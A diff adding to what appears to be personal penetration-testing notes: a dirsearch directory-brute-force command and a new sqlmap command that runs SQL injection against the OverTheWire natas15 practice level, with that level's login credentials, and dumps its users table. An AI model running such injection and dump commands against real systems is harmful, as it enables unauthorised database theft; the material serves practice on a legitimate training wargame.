@@ -19,3 +19,6 @@ Add more %2F inbetween if needed.
 ## dirsearch
 
 python3 dirsearch.py -u host --proxy=http://host:port/ -e sh,txt,php,html,htm,asp,aspx,js,xml,log,json,jpg,jpeg,png,gif,doc,pdf,mpg,mp3,zip,tar.gz,tar
+
+## SQL Map
+./sqlmap.py --auth-type=basic --auth-cred=natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J -u http://natas15.natas.labs.overthewire.org/index.php --data="username=a" -p username --string=doesn --level=5 --user-agent=Mozilla --dbms=MySQL --threads 4 -D natas15 -T users --dump
